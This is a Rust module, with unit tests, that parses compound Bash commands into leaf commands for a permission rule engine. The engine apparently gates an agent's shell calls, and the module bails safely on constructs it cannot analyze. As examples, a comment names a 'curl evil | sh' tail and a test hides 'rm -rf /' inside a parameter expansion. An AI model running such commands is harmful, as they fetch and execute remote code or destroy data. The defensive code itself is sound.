//! Splits a compound Bash command into independently-evaluable leaf commands.
//!
//! The bash-rule engine matches a single regex against the entire command string. That makes
//! compound commands hard to permission safely: a trivially-safe `echo a && ls` never matches a
//! plain `^ls` allow-rule, and a broad allow-rule matched against the *head* of a compound could
//! green-light a dangerous *tail* (`ls && curl evil | sh`). This module uses a real bash parser
//! (`brush-parser`, peg-based, no `unsafe`) to break a command into its leaf simple-commands so
//! each can be evaluated on its own.
//!
//! The safety posture is conservative: any construct we cannot fully reason about (command
//! substitution, subshells, process substitution, here-docs, compound commands, or an
//! unparseable string) produces a [`SplitOutcome::Bail`] so the caller can fail safe rather than
//! guess.

// 3rd party crates
use brush_parser::{
    ParserOptions,
    ast::{
        AndOr, Command, CommandPrefixOrSuffixItem, CompoundCommand, IoFileRedirectKind,
        IoFileRedirectTarget, IoRedirect, Pipeline, SimpleCommand, Word,
    },
    word::{ParameterExpr, WordPiece, WordPieceWithSource},
};
use serde::Serialize;

// local / workspace deps
use super::tool_rules::strip_cwd_prefix;

/// Result of splitting a command into leaves.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) enum SplitOutcome {
    /// The command parsed into N independently-evaluable simple commands, in execution order.
    Commands(Vec<LeafCommand>),
    /// The command contains a construct we cannot fully analyze; the caller must fail safe.
    Bail(BailReason),
}

/// A single leaf simple-command extracted from a (possibly compound) command.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct LeafCommand {
    /// cwd-normalized text of this leaf, used for rule matching.
    pub text: String,
    /// True when this leaf has a `>`/`>>`/`>|`/`&>` redirect to a real file (not `/dev/null`,
    /// not a file-descriptor duplication). Such a leaf must never be silently auto-allowed by a
    /// read-only allow-rule like `^echo`.
    pub real_file_write: bool,
}

/// Why [`split_command`] could not analyze a command. Carried for diagnostics; every variant maps
/// to "fail safe" at the call site.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
pub(crate) enum BailReason {
    /// `$(...)`, backticks, or `$((...))` (or a value-carrying parameter expansion that could
    /// embed one) appeared in a word.
    CommandSubstitution,
    /// A `( ... )` subshell.
    Subshell,
    /// A `<(...)` / `>(...)` process substitution.
    ProcessSubstitution,
    /// A here-document or here-string.
    HereDoc,
    /// A brace group, `if`/`for`/`while`/`case`, `[[ ]]`, `((…))`, or function definition.
    CompoundCommand,
    /// The command could not be tokenized or parsed (e.g. unbalanced quotes).
    ParseError,
}

/// Splits `command` into leaf simple-commands, normalizing in-cwd absolute paths to relative form
/// against `cwd` in the same pass.
///
/// `cwd` is the hook's working directory; words whose value begins with `cwd/` are rewritten to
/// their relative remainder so simple allow-rules can be written with relative paths (mirroring the
/// tool-rules field stripping). An empty `cwd` disables normalization.
pub(crate) fn split_command(command: &str, cwd: &str) -> SplitOutcome {
    let options = ParserOptions::default();

    let tokens = match brush_parser::tokenize_str(command) {
        Ok(tokens) => tokens,
        Err(_) => return SplitOutcome::Bail(BailReason::ParseError),
    };
    let program = match brush_parser::parse_tokens(&tokens, &options) {
        Ok(program) => program,
        Err(_) => return SplitOutcome::Bail(BailReason::ParseError),
    };

    // `SourcePosition.index` is a character offset, so collect chars once and slice/normalize by
    // char index rather than byte index (keeps multi-byte UTF-8 commands correct).
    let chars: Vec<char> = command.chars().collect();

    let mut leaves = Vec::new();
    for complete_command in &program.complete_commands {
        for item in &complete_command.0 {
            let and_or_list = &item.0;
            if let Err(bail) =
                collect_pipeline(&and_or_list.first, &chars, cwd, &options, &mut leaves)
            {
                return SplitOutcome::Bail(bail);
            }
            for and_or in &and_or_list.additional {
                let pipeline = match and_or {
                    AndOr::And(pipeline) | AndOr::Or(pipeline) => pipeline,
                };
                if let Err(bail) = collect_pipeline(pipeline, &chars, cwd, &options, &mut leaves) {
                    return SplitOutcome::Bail(bail);
                }
            }
        }
    }

    SplitOutcome::Commands(leaves)
}

fn collect_pipeline(
    pipeline: &Pipeline,
    chars: &[char],
    cwd: &str,
    options: &ParserOptions,
    leaves: &mut Vec<LeafCommand>,
) -> Result<(), BailReason> {
    for command in &pipeline.seq {
        match command {
            Command::Simple(simple) => leaves.push(leaf_from_simple(simple, chars, cwd, options)?),
            // A subshell gets its own reason so diagnostics can distinguish it; every other
            // compound construct (brace group, if/for/while/case, `[[ ]]`, `((…))`, function) is
            // out of scope for v1 and bails conservatively.
            Command::Compound(CompoundCommand::Subshell(_), _) => return Err(BailReason::Subshell),
            Command::Compound(_, _) | Command::Function(_) | Command::ExtendedTest(_, _) => {
                return Err(BailReason::CompoundCommand);
            }
        }
    }
    Ok(())
}

/// A word collected from a leaf, carrying enough information to faithfully reconstruct the leaf
/// text (preserving original quoting/spacing) and to substitute the cwd-normalized form.
struct LeafWord {
    /// The logical word text: the cwd-stripped value when normalized, else the raw word value.
    value: String,
    /// Character span `[start, end)` of the word in the original command, when known.
    span: Option<(usize, usize)>,
    /// Whether `value` differs from the word's source text (i.e. cwd-stripping applied).
    normalized: bool,
}

fn leaf_from_simple(
    simple: &SimpleCommand,
    chars: &[char],
    cwd: &str,
    options: &ParserOptions,
) -> Result<LeafCommand, BailReason> {
    let mut words: Vec<LeafWord> = Vec::new();
    let mut real_file_write = false;

    // Source order is prefix items, then the command name, then suffix items.
    if let Some(prefix) = &simple.prefix {
        for item in &prefix.0 {
            process_item(item, chars, cwd, options, &mut words, &mut real_file_write)?;
        }
    }
    if let Some(name) = &simple.word_or_name {
        push_word(name, chars, cwd, options, &mut words)?;
    }
    if let Some(suffix) = &simple.suffix {
        for item in &suffix.0 {
            process_item(item, chars, cwd, options, &mut words, &mut real_file_write)?;
        }
    }

    Ok(LeafCommand {
        text: build_leaf_text(&words, chars),
        real_file_write,
    })
}

fn process_item(
    item: &CommandPrefixOrSuffixItem,
    chars: &[char],
    cwd: &str,
    options: &ParserOptions,
    words: &mut Vec<LeafWord>,
    real_file_write: &mut bool,
) -> Result<(), BailReason> {
    match item {
        CommandPrefixOrSuffixItem::Word(word)
        | CommandPrefixOrSuffixItem::AssignmentWord(_, word) => {
            push_word(word, chars, cwd, options, words)
        }
        CommandPrefixOrSuffixItem::IoRedirect(redirect) => {
            process_redirect(redirect, chars, cwd, options, words, real_file_write)
        }
        // `<(...)` / `>(...)` runs a command in a subshell; cannot reason about it.
        CommandPrefixOrSuffixItem::ProcessSubstitution(_, _) => {
            Err(BailReason::ProcessSubstitution)
        }
    }
}

fn process_redirect(
    redirect: &IoRedirect,
    chars: &[char],
    cwd: &str,
    options: &ParserOptions,
    words: &mut Vec<LeafWord>,
    real_file_write: &mut bool,
) -> Result<(), BailReason> {
    match redirect {
        IoRedirect::File(_fd, kind, target) => match target {
            IoFileRedirectTarget::Filename(word) => {
                if writes_real_file(kind) && !is_dev_null(&word.value) {
                    *real_file_write = true;
                }
                push_word(word, chars, cwd, options, words)
            }
            IoFileRedirectTarget::Duplicate(word) => {
                // `2>&1` / `>&-` duplicate or close a descriptor and are benign, but `>&out.txt`
                // (a non-fd duplicate target under a write direction) actually writes a file.
                if writes_real_file(kind)
                    && !is_dev_null(&word.value)
                    && !is_fd_dup_target(&word.value)
                {
                    *real_file_write = true;
                }
                push_word(word, chars, cwd, options, words)
            }
            // A raw descriptor target (e.g. `>&2`) never names a file.
            IoFileRedirectTarget::Fd(_) => Ok(()),
            IoFileRedirectTarget::ProcessSubstitution(_, _) => Err(BailReason::ProcessSubstitution),
        },
        // `&>file` / `&>>file` redirect both stdout and stderr to a real file.
        IoRedirect::OutputAndError(word, _append) => {
            if !is_dev_null(&word.value) {
                *real_file_write = true;
            }
            push_word(word, chars, cwd, options, words)
        }
        IoRedirect::HereDocument(_, _) | IoRedirect::HereString(_, _) => Err(BailReason::HereDoc),
    }
}

/// True for redirection directions that can write to their file target.
///
/// `DuplicateOutput` (`>&`) is included for the `>&filename` form, which bash parses as
/// `File(_, DuplicateOutput, Duplicate(word))` with a non-fd word and which truly writes a file;
/// the caller's `Duplicate` arm still excludes the descriptor-dup forms (`2>&1`, `>&-`) via
/// [`is_fd_dup_target`]. Pure fd-to-fd dups arrive as a `Fd` target and never reach this check.
fn writes_real_file(kind: &IoFileRedirectKind) -> bool {
    matches!(
        kind,
        IoFileRedirectKind::Write
            | IoFileRedirectKind::Append
            | IoFileRedirectKind::Clobber
            | IoFileRedirectKind::ReadAndWrite
            | IoFileRedirectKind::DuplicateOutput
    )
}

fn is_dev_null(value: &str) -> bool {
    value == "/dev/null"
}

/// True when a duplicate-redirect target is a file-descriptor reference (`1`, `2-`, `-`) rather
/// than a filename.
fn is_fd_dup_target(value: &str) -> bool {
    if value == "-" {
        return true;
    }
    let digits = value.strip_suffix('-').unwrap_or(value);
    !digits.is_empty() && digits.chars().all(|c| c.is_ascii_digit())
}

/// Analyzes a word for un-reasonable constructs, then records it for leaf reconstruction.
fn push_word(
    word: &Word,
    chars: &[char],
    cwd: &str,
    options: &ParserOptions,
    words: &mut Vec<LeafWord>,
) -> Result<(), BailReason> {
    analyze_word(&word.value, options)?;

    let stripped = strip_cwd_prefix(&word.value, cwd);
    // Only rewrite to the relative form when the remainder stays within cwd. A remainder with a
    // `..` component escapes cwd, so keep the original absolute path: deny-rules written against
    // absolute paths still see it, and we never present a misleading relative form.
    let normalized = stripped != word.value && !has_parent_component(stripped);
    let value = if normalized {
        stripped.to_string()
    } else {
        word.value.clone()
    };
    let span = word.loc.as_ref().and_then(|loc| {
        let (start, end) = (loc.start.index, loc.end.index);
        // Guard against any index the parser reports outside the command (keeps slicing
        // panic-free); such a word falls back to value-based reconstruction.
        (start <= end && end <= chars.len()).then_some((start, end))
    });

    words.push(LeafWord {
        value,
        span,
        normalized,
    });
    Ok(())
}

/// Re-parses a word's value with the second-stage word parser to detect embedded expansions that
/// the command grammar keeps as a flat string. Bails on anything that executes a command.
fn analyze_word(value: &str, options: &ParserOptions) -> Result<(), BailReason> {
    match brush_parser::word::parse(value, options) {
        Ok(pieces) => check_pieces(&pieces),
        // A word the command grammar accepted but the word grammar rejects is not something we can
        // reason about; fail safe.
        Err(_) => Err(BailReason::ParseError),
    }
}

fn check_pieces(pieces: &[WordPieceWithSource]) -> Result<(), BailReason> {
    for piece in pieces {
        match &piece.piece {
            WordPiece::CommandSubstitution(_)
            | WordPiece::BackquotedCommandSubstitution(_)
            // Arithmetic can itself contain a command substitution and is never needed by an
            // auto-allowable read-only command, so treat it as substitution-class.
            | WordPiece::ArithmeticExpression(_) => return Err(BailReason::CommandSubstitution),
            WordPiece::DoubleQuotedSequence(inner)
            | WordPiece::GettextDoubleQuotedSequence(inner) => check_pieces(inner)?,
            // A bare `$VAR` / `${VAR}` / `${#VAR}` is safe, but any value-carrying form
            // (`${x:-$(evil)}`, `${x/.../...}`, substrings, transforms, …) keeps its embedded
            // value as an unparsed string that the word grammar does not break out, so it could
            // hide a command substitution. Bail conservatively on those.
            WordPiece::ParameterExpansion(expr) if !is_plain_parameter(expr) => {
                return Err(BailReason::CommandSubstitution)
            }
            _ => {}
        }
    }
    Ok(())
}

/// True for parameter expansions that are pure references to a variable (no embedded default,
/// pattern, substring, or transformation that could carry a command substitution).
fn is_plain_parameter(expr: &ParameterExpr) -> bool {
    matches!(
        expr,
        ParameterExpr::Parameter { .. } | ParameterExpr::ParameterLength { .. }
    )
}

/// True when a path contains a `..` component, i.e. it can climb above its base directory.
fn has_parent_component(path: &str) -> bool {
    path.split('/').any(|component| component == "..")
}

/// Reconstructs the leaf text from its words. Uses original-source slicing (preserving quoting,
/// spacing, and redirect operators between words) when every word has a known span, substituting
/// the cwd-normalized form for normalized words. Falls back to joining word values with single
/// spaces when any span is missing.
fn build_leaf_text(words: &[LeafWord], chars: &[char]) -> String {
    if words.is_empty() {
        return String::new();
    }

    if words.iter().any(|word| word.span.is_none()) {
        return words
            .iter()
            .map(|word| word.value.as_str())
            .collect::<Vec<_>>()
            .join(" ");
    }

    let mut ordered: Vec<&LeafWord> = words.iter().collect();
    ordered.sort_by_key(|word| word.span.expect("span checked present above").0);

    let leaf_start = ordered[0].span.expect("span checked present above").0;
    let mut out = String::new();
    let mut pos = leaf_start;
    for word in ordered {
        let (start, end) = word.span.expect("span checked present above");
        // Copy the original characters between the previous word and this one (spaces, redirect
        // operators, etc.), preserving the leaf's faithful surface form.
        if start > pos {
            out.extend(&chars[pos..start]);
        }
        if word.normalized {
            out.push_str(&word.value);
        } else {
            out.extend(&chars[start..end]);
        }
        pos = end.max(pos);
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    /// North-star command from the plan: every leaf is a trivially-safe read-only command.
    const NORTH_STAR: &str = r#"echo "===== Is there a lib.rs? =====" && ls crates/moriarty/src/lib.rs 2>/dev/null && echo "FOUND lib.rs" || echo "NO lib.rs (binary only via main.rs)"; echo; echo "===== Cargo.toml deps =====" && cat crates/moriarty/Cargo.toml; echo; cat Cargo.toml 2>/dev/null | head -60"#;

    fn leaves(command: &str, cwd: &str) -> Vec<LeafCommand> {
        match split_command(command, cwd) {
            SplitOutcome::Commands(leaves) => leaves,
            SplitOutcome::Bail(reason) => {
                panic!("expected Commands for {command:?}, got Bail({reason:?})")
            }
        }
    }

    fn texts(command: &str, cwd: &str) -> Vec<String> {
        leaves(command, cwd)
            .into_iter()
            .map(|leaf| leaf.text)
            .collect()
    }

    fn bail(command: &str) -> BailReason {
        match split_command(command, "") {
            SplitOutcome::Bail(reason) => reason,
            SplitOutcome::Commands(leaves) => {
                panic!("expected Bail for {command:?}, got {leaves:?}")
            }
        }
    }

    #[test]
    fn north_star_splits_into_expected_leaves() {
        assert_eq!(
            texts(NORTH_STAR, ""),
            vec![
                r#"echo "===== Is there a lib.rs? =====""#,
                "ls crates/moriarty/src/lib.rs 2>/dev/null",
                r#"echo "FOUND lib.rs""#,
                r#"echo "NO lib.rs (binary only via main.rs)""#,
                "echo",
                r#"echo "===== Cargo.toml deps =====""#,
                "cat crates/moriarty/Cargo.toml",
                "echo",
                "cat Cargo.toml 2>/dev/null",
                "head -60",
            ]
        );
    }

    #[test]
    fn north_star_has_no_real_file_writes() {
        assert!(
            leaves(NORTH_STAR, "")
                .iter()
                .all(|leaf| !leaf.real_file_write)
        );
    }

    #[test]
    fn quotes_and_escapes_keep_separators_inside_one_leaf() {
        for command in [r#"echo "a; b""#, r#"echo 'a && b'"#, r"echo a\;b"] {
            assert_eq!(leaves(command, "").len(), 1, "command {command:?}");
        }
        assert_eq!(texts(r#"echo "a; b""#, ""), vec![r#"echo "a; b""#]);
        assert_eq!(texts(r"echo a\;b", ""), vec![r"echo a\;b"]);
    }

    #[test]
    fn quoted_parens_do_not_trigger_subshell_bail() {
        assert_eq!(texts(r#"echo "(x)""#, ""), vec![r#"echo "(x)""#]);
    }

    #[test]
    fn pipeline_splits_each_stage() {
        assert_eq!(texts("a|b|c", ""), vec!["a", "b", "c"]);
    }

    #[test]
    fn newlines_split_into_separate_leaves() {
        assert_eq!(texts("echo a\necho b", ""), vec!["echo a", "echo b"]);
    }

    #[test]
    fn bails_on_unanalyzable_constructs() {
        assert_eq!(bail("cat $(whoami)"), BailReason::CommandSubstitution);
        assert_eq!(bail("echo `date`"), BailReason::CommandSubstitution);
        assert_eq!(bail("echo $((1 + 1))"), BailReason::CommandSubstitution);
        assert_eq!(bail("(ls)"), BailReason::Subshell);
        assert_eq!(bail("cat <(ls)"), BailReason::ProcessSubstitution);
        assert_eq!(bail("cat <<EOF\nhi\nEOF"), BailReason::HereDoc);
        assert_eq!(bail("cat <<<word"), BailReason::HereDoc);
        assert_eq!(bail("[[ -f x ]]"), BailReason::CompoundCommand);
        assert_eq!(bail("((1))"), BailReason::CompoundCommand);
        assert_eq!(bail("if true; then ls; fi"), BailReason::CompoundCommand);
        assert_eq!(bail(r#"echo "unbalanced"#), BailReason::ParseError);
    }

    #[test]
    fn bails_on_command_substitution_hidden_in_parameter_default() {
        // The dangerous `$(...)` lives inside the parameter expansion's default value, which the
        // word grammar keeps as an unparsed string; the conservative parameter-expansion bail
        // catches it so it can never be auto-allowed.
        assert_eq!(
            bail(r#"echo "${UNSET:-$(rm -rf /)}""#),
            BailReason::CommandSubstitution
        );
    }

    #[test]
    fn plain_parameter_expansions_are_allowed() {
        assert_eq!(texts("echo $HOME", ""), vec!["echo $HOME"]);
        assert_eq!(texts("echo ${PATH}", ""), vec!["echo ${PATH}"]);
    }

    #[test]
    fn classifies_real_file_write_redirects() {
        let write_cases = [
            "echo x > out.txt",
            "echo x >> out.txt",
            "echo x >| out.txt",
            // &> / &>> send stdout+stderr to a real file (OutputAndError).
            "echo x &> out.txt",
            "echo x &>> out.txt",
            // >& with a non-fd target writes a file (DuplicateOutput + Duplicate(filename)).
            "echo x >& out.txt",
            // <> opens for read+write (ReadAndWrite).
            "echo x <> out.txt",
        ];
        for command in write_cases {
            assert!(
                leaves(command, "")[0].real_file_write,
                "expected real_file_write for {command:?}"
            );
        }

        let benign_cases = [
            "ls 2>/dev/null",
            "ls >/dev/null",
            "ls 2>&1",
            // &>/dev/null is the discard form, not a real-file write.
            "ls &>/dev/null",
            // >&- closes a descriptor; >&2 / 2>&1 duplicate one.
            "ls >&-",
            "ls >&2",
            "echo hi",
            "cat < input.txt",
        ];
        for command in benign_cases {
            assert!(
                !leaves(command, "")[0].real_file_write,
                "expected no real_file_write for {command:?}"
            );
        }
    }

    #[test]
    fn redirect_to_real_file_keeps_operator_in_leaf_text() {
        assert_eq!(texts("echo x > out.txt", ""), vec!["echo x > out.txt"]);
    }

    #[test]
    fn normalizes_in_cwd_absolute_paths() {
        assert_eq!(
            texts("cat /abs/cwd/src/foo.rs", "/abs/cwd"),
            vec!["cat src/foo.rs"]
        );
    }

    #[test]
    fn normalization_leaves_unrelated_paths_untouched() {
        // Outside cwd, already-relative, parent-traversal, and partial-directory-name matches are
        // all left exactly as written.
        assert_eq!(
            texts("cat /etc/passwd", "/abs/cwd"),
            vec!["cat /etc/passwd"]
        );
        assert_eq!(texts("cat src/foo.rs", "/abs/cwd"), vec!["cat src/foo.rs"]);
        assert_eq!(
            texts("cat /abs/cwd/../secret", "/abs/cwd"),
            vec!["cat /abs/cwd/../secret"]
        );
        assert_eq!(
            texts("cat /abs/cwdX/foo", "/abs/cwd"),
            vec!["cat /abs/cwdX/foo"]
        );
    }

    #[test]
    fn empty_cwd_disables_normalization() {
        // The replay path falls back to an empty cwd for records that predate cwd logging; the
        // absolute path must then pass through untouched rather than being mangled.
        assert_eq!(
            texts("cat /abs/cwd/src/foo.rs", ""),
            vec!["cat /abs/cwd/src/foo.rs"]
        );
    }

    #[test]
    fn normalization_preserves_other_tokens_byte_for_byte() {
        // Only the in-cwd path is rewritten; the quoted argument keeps its quotes and spaces.
        assert_eq!(
            texts(r#"cat /abs/cwd/a.rs "keep me""#, "/abs/cwd"),
            vec![r#"cat a.rs "keep me""#]
        );
    }

    #[test]
    fn normalizes_redirect_target_paths() {
        let leaf = &leaves("cat < /abs/cwd/input.txt", "/abs/cwd")[0];
        assert_eq!(leaf.text, "cat < input.txt");
        assert!(!leaf.real_file_write);
    }

    #[test]
    fn unicode_command_slices_by_char_not_byte() {
        // A multi-byte argument before another token would corrupt a byte-indexed slice.
        assert_eq!(texts("echo 世界 ok", ""), vec!["echo 世界 ok"]);
    }

    #[test]
    fn build_leaf_text_falls_back_when_a_span_is_missing() {
        // Directly exercise the missing-span fallback, which is otherwise hard to trigger because
        // the parser populates spans for ordinary words.
        let words = vec![
            LeafWord {
                value: "cat".to_string(),
                span: Some((0, 3)),
                normalized: false,
            },
            LeafWord {
                value: "src/foo.rs".to_string(),
                span: None,
                normalized: true,
            },
        ];
        let chars: Vec<char> = "cat /abs/cwd/foo.rs".chars().collect();
        assert_eq!(build_leaf_text(&words, &chars), "cat src/foo.rs");
    }

    #[test]
    fn fd_dup_target_classification() {
        assert!(is_fd_dup_target("1"));
        assert!(is_fd_dup_target("2-"));
        assert!(is_fd_dup_target("-"));
        assert!(!is_fd_dup_target("out.txt"));
        assert!(!is_fd_dup_target(""));
    }
}
